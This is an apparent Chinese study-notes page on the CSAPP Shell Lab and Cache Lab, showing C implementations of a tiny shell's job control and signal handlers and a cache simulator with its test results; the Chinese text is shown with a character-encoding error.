<p>ä¸ºäº†è®©SIGINTä¿¡å·åªé€åˆ°å‰å°è¿›ç¨‹ï¼ˆç»„ï¼‰ï¼Œéœ€è¦åœ¨forkåè®¾ç½®å­è¿›ç¨‹çš„è¿›ç¨‹ç»„IDï¼Œç”¨setpgid(0, 0)ï¼Œä½¿ç”¨å½“å‰è¿›ç¨‹ï¼ˆforkå‡ºæ¥çš„å­è¿›ç¨‹ï¼‰çš„pidä½œä¸ºè¿›ç¨‹ç»„IDï¼›ä¹‹åå°±èƒ½ç”¨ kill(-pid, SIGINT)Â å‘é€ç»™è¿›ç¨‹ç»„|-pid|(pidçš„ç»å¯¹å€¼ï¼‰ä¸­çš„æ¯ä¸ªè¿›ç¨‹ã€‚</p>
<h2 id="waitpidè¡Œä¸º"><a class="header" href="#waitpidè¡Œä¸º">waitpidè¡Œä¸º</a></h2>
<pre><code class="language-c">pid_t waitpid(pid_t pid, int *statusp, int options); // é€šè¿‡optionsä¿®æ”¹é»˜è®¤è¡Œä¸º
</code></pre>
<p>é»˜è®¤è¡Œä¸ºï¼šæŒ‚èµ·è°ƒç”¨è¿›ç¨‹ï¼Œç›´åˆ°æœ‰å­è¿›ç¨‹ç»ˆæ­¢ï¼›</p>
<p>WNOHANGï¼šå¦‚æœç­‰å¾…é›†åˆä¸­çš„ä»»ä½•å­è¿›ç¨‹éƒ½è¿˜æ²¡æœ‰ç»ˆæ­¢ï¼Œé‚£ä¹ˆå°±ç«‹å³è¿”å›ï¼ˆè¿”å›å€¼ä¸º0ï¼‰ã€‚</p>
<p>WUNTRACEDï¼šæŒ‚èµ·è°ƒç”¨è¿›ç¨‹çš„æ‰§è¡Œï¼Œç›´åˆ°ç­‰å¾…é›†åˆä¸­çš„ä¸€ä¸ªè¿›ç¨‹å˜æˆå·²ç»ˆæ­¢æˆ–è€…è¢«åœæ­¢ã€‚</p>
<h2 id="å‰å°è¿›ç¨‹å’Œåå°è¿›ç¨‹"><a class="header" href="#å‰å°è¿›ç¨‹å’Œåå°è¿›ç¨‹">å‰å°è¿›ç¨‹å’Œåå°è¿›ç¨‹</a></h2>
<p>shelléœ€è¦ç­‰å¾…å‰å°è¿›ç¨‹çš„ç»“æŸï¼ˆè°ƒç”¨waitfg())ï¼Œè€Œåå°å­è¿›ç¨‹è¢«åˆ›å»ºåçˆ¶è¿›ç¨‹ç›´æ¥è¿”å›ã€‚</p>
<h2 id="ä¸€äº›å‘"><a class="header" href="#ä¸€äº›å‘">ä¸€äº›å‘</a></h2>
<p>åœ¨waitfgå‡½æ•°ä¸­ï¼Œæœ€å¥½ä½¿ç”¨å¿™å¾ªç¯ï¼ˆbusy loopï¼‰æ¥æ£€æŸ¥æ˜¯å¦jobsä¸­è¿˜æœ‰éœ€è¦ç­‰å¾…çš„å‰å°è¿›ç¨‹ï¼Œç”±äºåœ¨SIGCHLDä¿¡å·çš„å¤„ç†å‡½æ•°ä¸­å·²ç»è°ƒç”¨äº†waitpidå¤„ç†ï¼Œä¸èƒ½å†åœ¨çˆ¶è¿›ç¨‹çš„waitfgå‡½æ•°ä¸­è°ƒç”¨waitpidäº†å¦åˆ™ä¼šï¼š</p>
<pre><code class="language-sh">âœ  shlab-handout git:(master) âœ— ./tsh
tsh&gt; ./myspin 3
waitfg: waitpid error: No child processes
</code></pre>
<p>ä¸‹é¢å±•ç¤ºæœ€ç»ˆå®ç°çš„å‡½æ•°ï¼Œåœ¨å†™çš„æ—¶å€™å¯ä»¥å‚è€ƒtshref.outæ–‡ä»¶çš„è¾“å‡ºã€‚</p>
<h2 id="eval"><a class="header" href="#eval">eval</a></h2>
<p>è´Ÿè´£åˆ›å»ºå­è¿›ç¨‹ï¼Œå¢åŠ jobsåˆ—è¡¨ï¼Œè§£æå‘½ä»¤è¡Œ</p>
<pre><code class="language-c">void eval(char *cmdline) 
{
    char *argv[MAXARGS];
    int bg;
    pid_t pid = 0;  // process id

    sigset_t mask_all, mask_one, prev_one;
    sigfillset(&amp;mask_all);
    sigemptyset(&amp;mask_one);
    sigaddset(&amp;mask_one, SIGCHLD);

    bg = parseline(cmdline, argv);
    if (argv[0] == NULL) {
        return; // ignore the empty lines
    }

    if (!builtin_cmd(argv)) {
        sigprocmask(SIG_BLOCK, &amp;mask_one, &amp;prev_one); // Block SIGCHLD
        if ((pid = fork()) == 0) {  // child runs user job
            setpgid(0, 0); // ä½¿ç”¨å½“å‰è¿›ç¨‹ï¼ˆforkå‡ºæ¥çš„å­è¿›ç¨‹ï¼‰çš„pidä½œä¸ºè¿›ç¨‹ç»„ID
            sigprocmask(SIG_SETMASK, &amp;prev_one, NULL); // Unblock SIGCHLD å­è¿›ç¨‹ä¼šç»§æ‰¿çˆ¶è¿›ç¨‹çš„å±è”½ä¿¡å·é›†ï¼Œæ‰€ä»¥å–æ¶ˆå­è¿›ç¨‹å¯¹SIGCHLDçš„å±è”½
            if (execve(argv[0], argv, environ) &lt; 0) {
                printf(&quot;%s: Command not found.\n&quot;, argv[0]);
                exit(0);
            }
        }

        addjob(jobs, pid, bg == 1 ? BG : FG, cmdline);  // æˆåŠŸåœ°åŠ å…¥jobåï¼Œå†å¼€å§‹ç›‘å¬SIGCHLDä¿¡å·
        sigprocmask(SIG_SETMASK, &amp;prev_one, NULL); // Unblock SIGCHLD

        if (!bg) { // parent wait for foreground job
            waitfg(pid);
        } else {
            printf(&quot;[%d] (%d) %s&quot;, maxjid(jobs), pid, cmdline);
        }
    }
}
</code></pre>
<h3 id="buildin_cmd"><a class="header" href="#buildin_cmd">buildin_cmd</a></h3>
<p>å¯¹äºtshçš„å†…ç½®å‘½ä»¤ï¼Œç›´æ¥æ‰§è¡Œ</p>
<pre><code class="language-c">int builtin_cmd(char **argv) 
{
    if (!strcmp(argv[0], &quot;jobs&quot;)) {
        // listing the running and stopping background jobs
        Dprint(&quot;Listing jobs...\n&quot;);
        listjobs(jobs);
        return 1;
    }
    if (!strcmp(argv[0], &quot;quit&quot;)) {
        exit(0);
    }
    if (!strcmp(argv[0], &quot;fg&quot;) || !strcmp(argv[0], &quot;bg&quot;)) {
        do_bgfg(argv);
        return 1;
    }
    if (!strcmp(argv[0], &quot;kill&quot;)) {
        // Terminate a job
        pid_t pid = 0;
        int jid = 0;
        if (argv[1][0] == '%') {
            jid = atoi(argv[1]+1);
        } else {
            pid = atoi(argv[1]);
            jid = pid2jid(pid);
        }
        Dprintf(&quot;kill the job:pid = %d, jid = %d\n&quot;, pid, jid);
        struct job_t *job = getjobjid(jobs, jid);
        if (!job)
            return 1;
        kill(job-&gt;pid, SIGKILL);
        deletejob(jobs, pid);
        return 1;
    }
    return 0;     /* not a builtin command */
}
</code></pre>
<h3 id="do_bgfg"><a class="header" href="#do_bgfg">do_bgfg</a></h3>
<p>ä½¿å¾—æš‚åœçš„è¿›ç¨‹ç»§ç»­æ‰§è¡Œï¼Œå¦‚æœæ˜¯æŒ‡å®šä¸ºfgï¼Œtshç­‰å¾…è¿™ä¸ªä»»åŠ¡çš„æ‰§è¡Œ</p>
<pre><code class="language-c">void do_bgfg(char **argv) 
{
    pid_t pid = 0;
    int jid = 0;
    int input_is_jid = 0;
    if (argv[1] == NULL) {
        printf(&quot;%s command requires PID or %%jobid argument\n&quot;, argv[0]);
        return;
    }
    if (argv[1][0] == '%') {
        for (int i = 1; i &lt; strlen(argv[1]); ++i) {
            if (!isdigit(argv[1][i])) {
                printf(&quot;%s: argument must be a PID or %%jobid\n&quot;, argv[0]);
                return;
            }
        }
        jid = atoi(argv[1]+1);
        input_is_jid = 1;
    } else {
        for (int i = 0; i &lt; strlen(argv[1]); ++i) {
            if (!isdigit(argv[1][i])) {
                printf(&quot;%s: argument must be a PID or %%jobid\n&quot;, argv[0]);
                return;
            }
        }
        pid = atoi(argv[1]);
        jid = pid2jid(pid);
    }
    struct job_t* job = NULL;
    if (!(job = getjobjid(jobs, jid))) {
        if (input_is_jid) {
            printf(&quot;%s: No such job\n&quot;, argv[1]);
        } else {
            printf(&quot;(%s): No such process\n&quot;, argv[1]);
        }
        return;
    }
    Dprintf(&quot;Continue: pid = %d, jid = %d\n&quot;, job-&gt;pid, job-&gt;jid);
    // å‘é€ä¿¡å·ä½¿å¾—è¿›ç¨‹ç»§ç»­è¿è¡Œ
    kill(-job-&gt;pid, SIGCONT);
    if (!strcmp(argv[0], &quot;fg&quot;)) {
        // change a stopped or running background job to a running in the foreground
        job-&gt;state = FG;
        waitfg(job-&gt;pid);
    } else { // bg
        // Change a stopped background job to a running background job.
        job-&gt;state = BG;
        printf(&quot;[%d] (%d) %s&quot;, jid, pid, job-&gt;cmdline);
    }
}
</code></pre>
<h3 id="waitfg"><a class="header" href="#waitfg">waitfg</a></h3>
<p>tshç­‰å¾…å‰å°è¿›ç¨‹çš„ç»ˆæ­¢æˆ–åœæ­¢</p>
<pre><code class="language-c">void waitfg(pid_t pid)
{
//    int olderrno = errno;
//    int status;
//    if (waitpid(pid, &amp;status, WUNTRACED) &lt; 0) {
//        unix_error(&quot;waitfg: waitpid error&quot;);
//    }
//
//    if (errno != ECHILD)
//        unix_error(&quot;waitpid error&quot;);
//    errno = olderrno;
    while( pid == fgpid(jobs) ) {
        sleep(1);
    }
}
</code></pre>
<h2 id="ä¸‰ä¸ªä¿¡å·çš„å¤„ç†"><a class="header" href="#ä¸‰ä¸ªä¿¡å·çš„å¤„ç†">ä¸‰ä¸ªä¿¡å·çš„å¤„ç†</a></h2>
<h3 id="sigchld_handler"><a class="header" href="#sigchld_handler">sigchld_handler</a></h3>
<pre><code class="language-c">void sigchld_handler(int sig) 
{
//    int olderrno = errno;
    pid_t pid;
    int status;

    while ((pid = waitpid(-1, &amp;status, WUNTRACED|WNOHANG)) &gt; 0) { // è§£å†³ä¿¡å·ä¸æ’é˜Ÿçš„é—®é¢˜ï¼ˆå³å¤šä¸ªå­è¿›ç¨‹åŒæ—¶ç»“æŸï¼‰ï¼Œä¸ç­‰å¾…åå°è¿›ç¨‹
        if (WIFEXITED(status)) {
            // å­è¿›ç¨‹æ­£å¸¸ç»ˆæ­¢
            deletejob(jobs, pid);
            Dprint(&quot;Handler reaped child\n&quot;);
        } else if (WIFSIGNALED(status)) {
            // å­è¿›ç¨‹è¢«ä¿¡å·ç»ˆæ­¢
            printf(&quot;Job [%d] (%d) terminated by signal %d\n&quot;, pid2jid(pid), pid, WTERMSIG(status));
            deletejob(jobs, pid);
        } else if (WIFSTOPPED(status)) {
            // å­è¿›ç¨‹åœæ­¢
            printf(&quot;Job [%d] (%d) stopped by signal %d\n&quot;, pid2jid(pid), pid, WSTOPSIG(status));
            struct job_t* job = getjobpid(jobs, pid);
            if (job) {
                job-&gt;state = ST;
            }
            return;
        } else {
            Dprintf(&quot;child %d terminated abnormally\n&quot;, pid);
        }
    }
//    if (errno != ECHILD)
//        unix_error(&quot;waitpid error&quot;);
//    errno = olderrno;
}
</code></pre>
<h3 id="sigint_handler"><a class="header" href="#sigint_handler">sigint_handler</a></h3>
<pre><code class="language-c">void sigint_handler(int sig) 
{
    Dprint(&quot;ctrl-c pressed.\n&quot;);
    pid_t fg = fgpid(jobs);
    if (fg == 0) {
        Dprint(&quot;No fg process.\n&quot;);
        return;
    } else {
        kill(-fg, sig); // pid = -fg, å‘é€ç»™è¿›ç¨‹ç»„|pid|(pidçš„ç»å¯¹å€¼ï¼‰ä¸­çš„æ¯ä¸ªè¿›ç¨‹
    }
}
</code></pre>
<h3 id="sigtstp_handler"><a class="header" href="#sigtstp_handler">sigtstp_handler</a></h3>
<pre><code class="language-c">void sigtstp_handler(int sig) 
{
    Dprint(&quot;ctrl-z pressed.\n&quot;);
    pid_t fg = fgpid(jobs);
    if (fg == 0 ) {
        return;
    } else {
        kill(-fg, sig);
        struct job_t* job = getjobpid(jobs, fg);
        job-&gt;state = ST;
    }
}
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="csapp---cache-lab"><a class="header" href="#csapp---cache-lab">CSAPP - Cache Lab</a></h1>
<p>Computer Systems A Programmer's Perspective ä¹¦ç±è¯¾ç¨‹é…å¥—<a href="http://csapp.cs.cmu.edu/3e/labs.html">å®éªŒ</a></p>
<h2 id="parta"><a class="header" href="#parta">PartA</a></h2>
<p>å®ç°ä¸€ä¸ªcacheçš„æ¨¡æ‹Ÿç¨‹åºã€‚ï¼ˆå®éªŒç¯å¢ƒOSXï¼‰</p>
<p>é€šè¿‡è¯»å–traces/æ–‡ä»¶å¤¹ä¸‹çš„æŸä¸ªå†…å­˜è®¿é—®è®°å½•ï¼Œæ¨¡æ‹Ÿcacheçš„missã€hitã€evictionã€‚</p>
<p>å†…å­˜è®¿é—®æœ‰å››ç§ï¼š</p>
<ol>
<li><code>I &lt;address&gt;, sizeÂ </code> Â  =&gt; åŠ è½½æŒ‡ä»¤</li>
<li><code>M &lt;address&gt;, sizeÂ </code>Â  Â =&gt; ä¿®æ”¹å†…å­˜ä¸­çš„å€¼ï¼Œå…¶æ•ˆæœç›¸å½“äºLæŒ‡ä»¤åè·Ÿä¸€ä¸ªSæŒ‡ä»¤</li>
<li><code>LÂ &lt;address&gt;, sizeÂ </code>Â  Â =&gt; è¯»å–å†…å­˜</li>
<li><code>SÂ &lt;address&gt;, sizeÂ </code>Â  Â =&gt; å†™å†…å­˜</li>
</ol>
<p>æˆ‘ä»¬å®ç°çš„cacheæ¨¡æ‹Ÿå™¨è¦æ”¯æŒå¦‚ä¸‹çš„å‘½ä»¤è¡Œå‚æ•°ï¼š</p>
<ul>
<li>-h : æ˜¾ç¤ºå¸®åŠ©</li>
<li>-v ï¼šä»¥å†—ä½™æ ¼å¼æ˜¾ç¤ºå†…å­˜è®¿é—®çš„æƒ…å†µ</li>
<li>-s : Sn = 2sÂ æŒ‡å®šäº†cacheä¸­çš„ç»„æ•°ä¸ºSn</li>
<li>-E : ç›¸è”åº¦ï¼Œæ¯ç»„å¤šå°‘è¡Œ</li>
<li>-b : cacheå—å¤§å° B = 2b</li>
<li><code>-t &lt;tracefile&gt;</code> : æŒ‡å®šcacheè¯»å–çš„å†…å­˜è®¿é—®åºåˆ—æ‰€åœ¨æ–‡ä»¶</li>
</ul>
<p>å¯ä»¥å…ˆä½¿ç”¨csim-refsæ¥çœ‹çœ‹é¢„æœŸçš„ç¨‹åºè¿è¡Œç»“æœã€‚åœ¨csim.cæ–‡ä»¶ä¸­å®Œæˆè¿™ä¸ªå®éªŒã€‚</p>
<p>Cacheæ•°æ®ç»“æ„çš„å®šä¹‰</p>
<pre><code class="language-c">struct cacheLine
{
    __uint64_t tag;
	bool valid;
	short* blocks;
	int age;  // è®°å½•è¢«è®¿é—®æ—¶çš„å¹´é¾„ï¼Œå¹´é¾„å€¼è¶Šå°ï¼Œè¶Šè€
};

typedef struct set {
	struct cacheLine* lines;
	int ageCount; // cacheç»„çš„è®¿é—®å¹´é¾„ï¼Œæ¯æ¬¡è®¿é—®éƒ½å¢åŠ 
}Set;

typedef struct cache {
    Set* sets;
    int setNum;
    int blockSize;
    int lineNum;
}Cache;
</code></pre>
<p>LRUç®—æ³•çš„å®ç°ï¼Œå‚è€ƒäº†<a href="https://en.wikipedia.org/wiki/Cache_replacement_policies">Wikipedia</a>ä¸Šçš„ä¸€ä¸ªè§£é‡Šã€‚å¦‚ä¸‹æ˜¯ä¸€ä¸ªcacheç»„ï¼Œæ¯ç»„4è¡Œï¼Œè®¿é—®åºåˆ—æ˜¯ABCDEDF</p>
<p><img src="https://en.wikipedia.org/wiki/File:Lruexample.png" alt="" /></p>
<p>ç”±äºcacheæ˜¯çº¿æ€§è¡¨çš„ç»“æ„ï¼Œæ— æ³•ä½¿ç”¨ç±»ä¼¼FILOçš„æ–¹å¼å®ç°LRUã€‚æˆ‘è¿™è¾¹ä½¿ç”¨äº†ä¸€ä¸ªå¹´é¾„è®¡æ•°æ³•ï¼Œæ¯æ¬¡è®¿é—®ä¸€ä¸ªcacheè¡Œï¼Œè¯¥è¡Œçš„å¹´é¾„å°±ä¼šå¢åŠ ï¼ˆè®¾ç½®ä¸ºå½“å‰çš„cacheç»„å¹´é¾„ï¼Œéšè®¿é—®æ¬¡æ•°å¢åŠ è€Œå¢åŠ ï¼‰ï¼Œcacheç»„ä¸­å¹´é¾„å€¼æœ€å°çš„å°±æ˜¯åº”è¯¥è¢«æ·˜æ±°çš„ï¼ˆevictionï¼‰</p>
<p>è§£æå‘½ä»¤è¡Œå‚æ•°</p>
<pre><code class="language-c">#define true 1
#define false 0

#define DEBUG 0
#define Dprintf(fmt, ...) if (DEBUG) printf(fmt, __VA_ARGS__)

typedef int bool;

typedef struct argsinfo {
	bool verbose;		// å†—é•¿è¾“å‡º
	int setBitNum;			// ç»„ä½æ•°
	int cacheLineNum;	// æ¯ç»„è¡Œæ•°
	int blockBitNum;		// å—ä½æ•°
	char* file;			// .traceæ–‡ä»¶
}ArgsInfo;

bool parseArgs(ArgsInfo* argsInfo, int argc, char** argv) {
	if (argc != 9 &amp;&amp; argc != 10) {
		printf(&quot;Usage: %s [-v] -s  -E  -b  -t \n&quot;, argv[0]);
		exit(0);
	}
	int i;
	for (i = 1; i &lt; argc; i++) {
		if (!strcmp(argv[i], &quot;-v&quot;)) {
			argsInfo-&gt;verbose = true;
		} else if (!strcmp(argv[i], &quot;-s&quot;)) {
			i++;
			argsInfo-&gt;setBitNum = atoi(argv[i]);
		} else if (!strcmp(argv[i], &quot;-E&quot;)) {
			i++;
			argsInfo-&gt;cacheLineNum = atoi(argv[i]);
		} else if (!strcmp(argv[i], &quot;-b&quot;)) {
			i++;
			argsInfo-&gt;blockBitNum = atoi(argv[i]);
		} else if (!strcmp(argv[i], &quot;-t&quot;)) {
			i++;
			argsInfo-&gt;file = (char *)malloc(strlen(argv[i]) + 1);
			// printf(&quot;sizeof *argv[i] = %lu\n&quot;, sizeof(*argv[i])); // 1 for *argv[i], 8 for argv[i]
			// printf(&quot;strlen argv = %lu\n&quot;, strlen(argv[i]));
			strcpy(argsInfo-&gt;file, argv[i]);
			// printf(&quot;strlen file = %lu\n&quot;, strlen(argsInfo-&gt;file)); // same as argv[i]
		} else {
			printf(&quot;Wrong Parameter!\n&quot;);
			exit(-1);
		}
	}
	Dprintf(&quot;Verbose: %d, setBitNum = %d, cacheLineNum = %d, blockBitNum = %d, file = %s\n&quot;,
		argsInfo-&gt;verbose, argsInfo-&gt;setBitNum, argsInfo-&gt;cacheLineNum, argsInfo-&gt;blockBitNum, argsInfo-&gt;file);
	return true;
}
</code></pre>
<p>cacheç»“æ„çš„åˆå§‹åŒ–å’Œé‡Šæ”¾</p>
<pre><code class="language-c">bool initCache(Cache* cache, ArgsInfo* argsInfo){
    cache-&gt;setNum = pow(2, argsInfo-&gt;setBitNum);
    cache-&gt;lineNum = argsInfo-&gt;cacheLineNum;
    cache-&gt;blockSize = pow(2, argsInfo-&gt;blockBitNum);
    cache-&gt;sets = (Set *)malloc(sizeof (Set) * cache-&gt;setNum);

	for (int i = 0;i &lt; cache-&gt;setNum; i++) {
	    // ç»™æ¯ä¸€ä¸ªç»„åˆ†é…cacheè¡Œ
        cache-&gt;sets[i].lines = (struct cacheLine *)malloc(argsInfo-&gt;cacheLineNum * sizeof(struct cacheLine));
        cache-&gt;sets[i].ageCount = 0;
		for (int j = 0; j &lt; argsInfo-&gt;cacheLineNum; j++) {
            cache-&gt;sets[i].lines[j].blocks = NULL; // We don't really store the data. (short *)malloc(cache-&gt;blockSize * sizeof (short));
            cache-&gt;sets[i].lines[j].tag = 0;
            cache-&gt;sets[i].lines[j].valid = false;
            cache-&gt;sets[i].lines[j].age = 0;
//            memset(cache-&gt;sets[i].lines[j].blocks, 0, sizeof(short) * cache-&gt;blockSize);
		}
	}
	Dprintf(&quot;Init cache success.\nsetNum = %d, lineNum = %d, blockSize = %d\n&quot;,
        cache-&gt;setNum, cache-&gt;lineNum, cache-&gt;blockSize);
	return true;
}

void freeCache(Cache* cache){
    for (int i = 0; i &lt; cache-&gt;setNum; ++i) {
//        for (int j = 0; j &lt; cache-&gt;lineNum; ++j) {
//            free(cache-&gt;sets[i].lines[j].blocks);
//        }
        free(cache-&gt;sets[i].lines);
    }
    free(cache-&gt;sets);
}
</code></pre>
<p>åœ¨cacheä¸­æŸ¥æ‰¾æ•°æ®ã€ç©ºè¡Œã€å¯»æ‰¾éœ€è¦æ›¿æ¢çš„è¡Œ</p>
<pre><code class="language-c">struct cacheLine* findData(Cache* cache, __uint64_t tag, __uint64_t setIndex){
    struct cacheLine* lines = cache-&gt;sets[setIndex].lines;
    for (int i = 0; i &lt; cache-&gt;lineNum; ++i) {
        if (lines[i].valid &amp;&amp; lines[i].tag == tag) {
            return lines+i;
        }
    }
    return NULL;
}

struct cacheLine* findEmptyLine(Cache* cache, __uint64_t setIndex) {
    struct cacheLine* lines = cache-&gt;sets[setIndex].lines;
    for (int i = 0; i &lt; cache-&gt;lineNum; ++i) {
        if (lines[i].valid == false) {
            return lines+i;
        }
    }
    return NULL;
}

struct cacheLine* findEvictionLine(Cache* cache, __uint64_t setIndex) {  // LRU
    // all the cache line is valid, find the line that has the lowest age value
    struct cacheLine* lines = cache-&gt;sets[setIndex].lines;
    int minIndex = 0;
    int minAge = lines[0].age;
    for (int i = 1; i &lt; cache-&gt;lineNum; ++i) {
        if (lines[i].age &lt; minAge){
            minAge = lines[i].age;
            minIndex = i;
        }
    }
    return lines+minIndex;
}
</code></pre>
<p>ä¸»å‡½æ•°</p>
<pre><code class="language-c">int main(int argc, char** argv)
{
	// parse args
	ArgsInfo argsInfo;
	parseArgs(&amp;argsInfo, argc, argv);
	Cache cache;
	initCache(&amp;cache, &amp;argsInfo);

	FILE* fp = fopen(argsInfo.file, &quot;r&quot;);
    if(!fp) {
        perror(&quot;File opening failed&quot;);
        return EXIT_FAILURE;
    }

    char *buf = NULL;
    size_t len;
    AccessInfo accessInfo;
//    Dprintf(&quot;sizeof unsigned = %lu\n&quot;, sizeof(unsigned )); // 4
//    unsigned a = 0x80000000;
//    Dprintf(&quot;a &gt;&gt; 31 = 0x%x\n&quot;, a &gt;&gt; 31); // 0x1
//    int a = 0x80000000;
//    Dprintf(&quot;a &gt;&gt; 31 = 0x%x\n&quot;, a &gt;&gt; 31); // 0xffffffff

    __int64_t min64 = 1; // æœ‰ç¬¦å·æ•°
    __uint64_t temp = (min64 &lt;&lt; 63) &gt;&gt; (argsInfo.setBitNum - 1); // ç®—æ•°å³ç§»
    Dprintf(&quot;temp = 0x%llx\n&quot;, temp);
    __uint64_t mask = ((__uint64_t)temp) &gt;&gt; (64 - argsInfo.setBitNum); // setBitNum ä½æ•°çš„æ©ç ï¼Œé€»è¾‘å³ç§»
    Dprintf(&quot;mask = 0x%llx\n&quot;, mask);

    int hits = 0, misses = 0, evictions = 0;
    while (getline(&amp;buf, &amp;len, fp) != -1) {
        if (parseAccessInfo(buf, &amp;accessInfo)) {
            __uint64_t tagNSet = accessInfo.address &gt;&gt; argsInfo.blockBitNum;
            __uint64_t tag = (tagNSet &amp; ~(mask)) &gt;&gt; argsInfo.setBitNum;
            __uint64_t setIndex = tagNSet &amp; mask;
            Dprintf(&quot;tag = 0x%llx, set = 0x%llx\n&quot;, tag, setIndex);

            if (argsInfo.verbose) {
                printf(&quot;%c %llx,%d &quot;, accessInfo.op, accessInfo.address, accessInfo.size);
            }

            switch (accessInfo.op) {
                case 'S':
                case 'L': { // remember to use brackets to include the whole case
                    struct cacheLine *line = NULL;
                    if ((line = findData(&amp;cache, tag, setIndex))) { // remember to use little brackets to include the assignment
                        hits++;
                        line-&gt;age = cache.sets[setIndex].ageCount;
                        if (argsInfo.verbose) printf(&quot;hit\n&quot;);
                    } else {
                        misses++;
                        if (argsInfo.verbose) printf(&quot;miss&quot;);
                        struct cacheLine *modifyLine = NULL;
                        if ((modifyLine = findEmptyLine(&amp;cache, setIndex))) {
                            modifyLine-&gt;valid = true;
                            modifyLine-&gt;tag = tag;
                            modifyLine-&gt;age = cache.sets[setIndex].ageCount;
                            if (argsInfo.verbose) printf(&quot;\n&quot;);
                        } else {
                            evictions++;
                            if (argsInfo.verbose) printf(&quot; eviction\n&quot;);
                            struct cacheLine *evictedLine = findEvictionLine(&amp;cache, setIndex);
                            Dprintf(&quot;Evict: set=%llu, tag=%llx\n&quot;, setIndex, evictedLine-&gt;tag);
                            evictedLine-&gt;valid = true;
                            evictedLine-&gt;tag = tag;
                            evictedLine-&gt;age = cache.sets[setIndex].ageCount;
                        }
                    }
                    cache.sets[setIndex].ageCount++;
                    break;
                }
                case 'M': {
                    struct cacheLine *line = NULL;
                    if ((line = findData(&amp;cache, tag, setIndex))) {
                        hits++;
                        if (argsInfo.verbose) printf(&quot;hit &quot;);
                        line-&gt;age = cache.sets[setIndex].ageCount;
                        line-&gt;valid = true;
                        hits++;
                        if (argsInfo.verbose) printf(&quot;hit\n&quot;); // hit by store
                    } else {
                        misses++;
                        if (argsInfo.verbose) printf(&quot;miss &quot;);
                        struct cacheLine* modifyLine = NULL;
                        if ((modifyLine = findEmptyLine(&amp;cache, setIndex))) {
                            modifyLine-&gt;valid = true;
                            modifyLine-&gt;age = cache.sets[setIndex].ageCount;
                            modifyLine-&gt;tag = tag;
                            hits++;
                            if (argsInfo.verbose) printf(&quot;hit\n&quot;);
                        } else {
                            evictions++;
                            if (argsInfo.verbose) printf(&quot;eviction &quot;);
                            struct cacheLine* evictedLine = findEvictionLine(&amp;cache, setIndex);
                            Dprintf(&quot;Evict: set=%llu, tag=%llx\n&quot;, setIndex, evictedLine-&gt;tag);
                            evictedLine-&gt;valid = true;
                            evictedLine-&gt;tag = tag;
                            evictedLine-&gt;age = cache.sets[setIndex].ageCount;
                            hits++;
                            if (argsInfo.verbose) printf(&quot;hit\n&quot;);
                        }
                    }
                    cache.sets[setIndex].ageCount++;
                    break;
                }
                default:
                    exit(-1);
            }
        }
    }
	freeCache(&amp;cache);
    printSummary(hits, misses, evictions);
    return 0;
}

bool parseAccessInfo(char* buf, AccessInfo* accessInfo){
    if (buf[0] == 'I') { // ignore the instruction access
        return false;
    }
    accessInfo-&gt;op = buf[1];
    accessInfo-&gt;address = strtol(&amp;buf[3], NULL, 16);
    char *ptr = strtok(buf, &quot;,&quot;);
//    Dprintf(&quot;%s&quot;, ptr);
    ptr = strtok(NULL, &quot; &quot;);
    accessInfo-&gt;size = (int)strtol(ptr, NULL, 10);
    Dprintf(&quot;\nAccessInfo: op = %c, address = 0x%llx, size = %d\n&quot;,
            accessInfo-&gt;op, accessInfo-&gt;address, accessInfo-&gt;size);
    return true;
}
</code></pre>
<p>ä¸ºäº†ä½¿ç”¨test-csimï¼Œå‘ç°linuxä¸æ”¯æŒgetlineå‡½æ•°ï¼Œæ‰€ä»¥ä½¿ç”¨fgetsæ›¿ä»£ï¼Œç›®çš„éƒ½æ˜¯è¯»å–ä¸€è¡Œè¾“å…¥ï¼›åŒæ—¶linuxä¹Ÿä¸æ”¯æŒ__VA_ARGS__çš„å®ã€‚åšäº†è¿™äº›æ”¹åŠ¨ä¹‹ååœ¨linuxæœåŠ¡å™¨ä¸Šè¿è¡Œå¾—åˆ°æ­£ç¡®ç»“æœï¼š</p>
<pre><code class="language-sh">sugar@ubuntuServer:~/csappLab/cachelab-handout$ make
gcc -g -Wall -Werror -std=c99 -m64 -o csim csim.c cachelab.c -lm 
gcc -g -Wall -Werror -std=c99 -m64 -O0 -c trans.c
gcc -g -Wall -Werror -std=c99 -m64 -o test-trans test-trans.c cachelab.c trans.o 
gcc -g -Wall -Werror -std=c99 -m64 -O0 -o tracegen tracegen.c trans.o cachelab.c
# Generate a handin tar file each time you compile
tar -cvf sugar-handin.tar  csim.c trans.c 
csim.c
trans.c
sugar@ubuntuServer:~/csappLab/cachelab-handout$ ./test-csim 
                        Your simulator     Reference simulator
Points (s,E,b)    Hits  Misses  Evicts    Hits  Misses  Evicts
     3 (1,1,1)       9       8       6       9       8       6  traces/yi2.trace
     3 (4,2,4)       4       5       2       4       5       2  traces/yi.trace
     3 (2,1,4)       2       3       1       2       3       1  traces/dave.trace
     3 (2,1,3)     167      71      67     167      71      67  traces/trans.trace
     3 (2,2,3)     201      37      29     201      37      29  traces/trans.trace
     3 (2,4,3)     212      26      10     212      26      10  traces/trans.trace
     3 (5,1,5)     231       7       0     231       7       0  traces/trans.trace
     6 (5,1,5)  265189   21775   21743  265189   21775   21743  traces/long.trace
    27

TEST_CSIM_RESULTS=27
</code></pre>
<h3 id="part-b"><a class="header" href="#part-b">Part B</a></h3>
<p>å®éªŒå‡†å¤‡ï¼šéœ€è¦ç¨‹åºè¿è¡Œæ—¶å†…å­˜è®¿é—®åºåˆ—çš„è·å–ï¼Œlinuxå¯èƒ½éœ€è¦å®‰è£…valgrind</p>
<p>ç¼–å†™çŸ©é˜µè½¬ç½®ç®—æ³•ï¼Œä½¿å¾—è¯¥ç®—æ³•åœ¨ä¸€ä¸ªç›´æ¥æ˜ å°„çš„cacheä¸Šæœ‰è¾ƒé«˜çš„å‘½ä¸­ç‡ã€‚cacheçš„å‚æ•°ä¸ºï¼š32ç»„ã€æ¯ç»„1è¡Œã€å—å¤§å°ä¸º32bytesã€‚</p>
<p>ä¸€å¼€å§‹åªæ˜¯ä½¿ç”¨äº†åˆ†å—çš„æ€æƒ³ï¼Œæ¯æ¬¡å¤„ç†ä¸€ä¸ª8 * 8å¤§å°çš„intç±»å‹çŸ©é˜µï¼Œé€‰æ‹©8æ˜¯å› ä¸ºcacheæ¯è¡Œåªèƒ½æ”¾ä¸‹8ä¸ªintå…ƒç´ ã€‚</p>
<pre><code class="language-c">char transpose_submit_desc[] = &quot;Transpose submission&quot;;
void transpose_submit(int M, int N, int A[N][M], int B[M][N]){
